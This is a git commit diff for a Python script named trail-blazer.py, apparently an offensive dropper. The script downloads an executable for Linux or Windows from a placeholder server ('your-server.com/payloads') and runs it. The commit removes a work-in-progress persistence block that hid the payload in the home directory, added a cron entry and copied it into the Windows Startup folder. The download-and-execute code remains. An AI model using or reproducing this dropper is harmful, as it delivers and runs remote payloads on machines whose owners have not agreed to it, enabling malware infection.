e05b154f27ee155a07fd801e2d2f71342855fdf1
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-06-27 08:52:04 -0300

    Update trail-blazer.py

--- Source/trail-blazer.py
+++ Source/trail-blazer.py
@@ -10,26 +10,12 @@ if platform_os == "Linux":
 elif platform_os == "Windows":
     filename = "Windows Exe Name.exe" #EXE: Executable
 
-
 if True:
     # Download:
     data = requests.get("http://your-server.com/payloads/{0}".format(filename))
     # Save
     with open(filename, "wb") as fl:
         fl.write(data.content)
-    
-# Try persistense [WIP]:
-try:
-    if platform_os == "Linux":
-        shutil.copy(filename, '{0}/.{1}'.format(Path.home(), filename))
-        os.system("chmod +x {0}/.{1}".format(Path.home(), filename))
-        os.system("crontab -e :set for every 10 min;0-59/10 * * * * ./{0}/.{1}".format(Path.home(), filename))
-    elif platform_os == "Windows":
-        new_path = '%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\{0}'.format(filename)
-        shutil.copy(filename, new_path)
-        os.system('sc config schedule start=auto;net start schedule at 12:00 \"\"{0}\"\"'.format(new_path))
-except Exception as error:
-    print(error)
         
 # Run:
 subprocess.Popen(args="", executable=filename)
